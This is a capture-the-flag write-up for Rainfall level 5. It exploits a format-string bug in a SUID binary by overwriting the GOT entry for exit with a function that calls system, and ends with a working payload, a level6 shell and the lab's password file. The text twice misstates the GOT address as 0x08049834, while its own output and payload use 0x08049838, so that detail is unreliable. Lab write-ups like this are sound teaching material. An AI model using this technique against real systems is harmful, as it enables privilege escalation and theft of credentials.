# Walk-through Level5

## Introduction
Level5 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level5@RainFall:~$ checksec --file level5 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level5
```
**Key observations:**
```
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.
```
### Analyzing `level5`

After running the command `ls -l level5`, we observe the following output:

```
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

From this output, we can see that the binary `level5` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level6`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level6` user.


## Debugging
```
level5@RainFall:~$ ./level5
helloworld
helloworld
```
After running `./level5`, we found that it behaves similarly to the previous level. Let's debug it using GDB.  
```bash
gdb-peda$ disassemble main  
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
```
We can see that `main` directly calls the function `n`.  

```bash
gdb-peda$ disassemble n  
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.  
```
After analyzing the assembly code, we couldn't find anything immediately useful. So, let's use `objdump` to inspect all functions in the binary:

```bash
objdump -D level5
```

The output reveals three functions:

```output
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55                   	push   %ebp
 8048505:	89 e5                	mov    %esp,%ebp
 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave  
 8048510:	c3                   	ret    
```

From the output, we see three functions:  
- `o` at `0x080484a4`
- `n` at `0x080484c2`
- `main` at `0x08048504`

The key point here is that the function `o` calls `system@plt`, which could potentially give us access to a shell if we can call it. We can exploit this by leveraging a format string vulnerability, which we confirmed earlier.

To exploit this, we need to redirect the program’s control flow to call the function `o` instead of the default `exit@plt`. By using a specific offset in the format string, we could overwrite the address of `exit` with the address of `o`, ultimately executing the `system` function to get a shell.


First, let's find the address of `exit` in the Global Offset Table (GOT) by using `objdump`:

```bash
objdump -R level5
```
Output:
```
level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
From this output, the address of `exit` is at `0x08049834`.
We also know the address of the `o` function is at `0x080484a4`.

### Determining the Position of the `exit` Address

Next, we need to determine the position of the address `0x08049834` when injected into the format string.
To do this, we can run the following Python command:

```bash
python -c 'print("\x38\x98\x04\x08" + "%p " * 10)' | ./level5
```

Output:

```
0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

From the output, we can see that the address `0x08049834` appears at **position 4** in the format string.

### Constructing the Payload

Now that we know the position of the address in the stack, we can construct the payload. The goal is to overwrite the GOT entry for `exit` with the address of the `o` function. 

The payload format will be:
```
<address of exit>%<padding(address of o in decimal)>%(position of address when injected)$n
```

This payload will overwrite the GOT entry for `exit` with the address of the `o` function and redirect program execution to `o`.

## Running this payload:

```
level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08%134513824x%4$n")'; cat) | ./level5 
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a3
```